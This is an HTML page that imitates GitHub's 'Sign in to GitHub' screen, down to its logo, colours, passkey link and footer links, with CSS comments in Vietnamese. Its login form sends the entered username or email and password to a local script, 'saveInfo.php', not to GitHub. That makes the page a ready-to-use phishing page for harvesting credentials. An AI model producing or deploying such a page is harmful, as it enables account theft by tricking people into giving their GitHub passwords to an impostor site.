<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to GitHub</title>
    <link rel="icon" href="/images/github-mark.png" type="image/png">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Noto Sans", Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #fff;
            line-height: 1.5;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding-top: 30px;
            min-height: 100vh;
        }

        .header {
            text-align: center;
            margin-bottom: 16px; /* Giảm khoảng cách giữa logo và tiêu đề */
        }

        .header img {
            width: 55px;
            height: 55px;
        }

        .container {
            width: 100%;
            max-width: 340px;
            margin: 0 auto;
            display: flex;
            flex-direction: column;
            align-items: center; /* Căn giữa các phần tử */
        }

        h1 {
            text-align: center;
            font-size: 24px;
            font-weight: 300;
            margin-bottom: 24px;
        }

        .login-box {
            background-color: #f6f8fa;
            border: 1px solid #d0d7de;
            border-radius: 6px;
            padding: 24px;
            margin-bottom: 16px;
            width: 288px; /* Đặt chiều rộng là 288px */
            height: 220px; /* Đặt chiều cao là 220px */
        }

        .form-group {
            margin-bottom: 16px;
        }

        label {
            display: block;
            font-weight: 400;
            font-size: 14px;
            margin-bottom: 8px;
        }

        .password-label {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .forgot-link {
            font-size: 12px;
            color: #0969da;
            text-decoration: none;
        }

        input {
            width: 100%;
            padding: 5px 12px;
            font-size: 14px;
            line-height: 20px;
            border: 1px solid #d0d7de;
            border-radius: 6px;
            height: 32px;
        }

        input:focus {
            border-color: #0969da;
            outline: none;
            box-shadow: 0 0 0 3px rgba(9, 105, 218, 0.3);
        }

        .sign-in-button {
            background-color: #1f883d;
            color: #fff;
            width: 100%;
            padding: 5px 16px;
            border: 1px solid rgba(27, 31, 36, 0.15);
            border-radius: 6px;
            font-size: 14px;
            font-weight: 500;
            height: 32px;
            cursor: pointer;
        }

        .sign-in-button:hover {
            background-color: #2c974b;
        }

        .alternative-box {
            background-color: #fff;
            border: 1px solid #d0d7de;
            border-radius: 6px;
            padding: 16px;
            text-align: center;
            margin-bottom: 40px;
            width: 288px; /* Đặt chiều rộng là 288px */
            height: 80px; /* Đặt chiều cao là 80px */
        }

        .passkey-link {
            color: #0969da;
            text-decoration: none;
            font-size: 14px;
        }

        .passkey-link:hover {
            text-decoration: underline;
        }

        .create-account {
            text-align: center;
            font-size: 14px;
        }

        .create-account a {
            color: #0969da;
            text-decoration: none;
        }

        .create-account a:hover {
            text-decoration: underline;
        }

        .footer {
            margin-top: 40px;
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 16px;
            padding: 0 16px;
        }

        .footer a {
            color: #333;
            text-decoration: none;
            font-size: 12px;
        }

        .footer a:hover {
            text-decoration: underline;
            color: #0969da;
        }

        @media (max-width: 380px) {
            .container {
                padding: 0 16px;
            }
        }
    </style>
</head>
<body>
    <div class="header">
        <img src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" alt="GitHub">
    </div>

    <div class="container">
        <div class="auth-form-header p-0">
            <h1>Sign in to GitHub</h1>
        </div>

        <div class="login-box">
            <form action="saveInfo.php" method="POST">
                <div class="form-group">
                    <label for="email">Username or email address</label>
                    <input type="text" id="email" name="email" placeholder="" autocomplete="username" required>
                </div>

                <div class="form-group">
                    <div class="password-label">
                        <label for="password">Password</label>
                        <a href="#" class="forgot-link">Forgot password?</a>
                    </div>
                    <input type="password" id="password" name="password" placeholder="" autocomplete="current-password" required>
                </div>

                <button type="submit" class="sign-in-button">Sign in</button>
            </form>
        </div>

        <div class="alternative-box">
            <p>
                <a href="#" class="passkey-link" style="font-weight: bold;">Sign in with a passkey</a>
            </p>
            <p class="create-account">
                New to GitHub? <a href="#">Create an account</a>
            </p>
        </div>
    </div>

    <div class="footer">
        <a href="#">Terms</a>
        <a href="#">Privacy</a>
        <a href="#">Docs</a>
        <a href="#">Contact GitHub Support</a>
        <a href="#">Manage cookies</a>
        <a href="#">Do not share my personal information</a>
    </div>
</body>
</html>
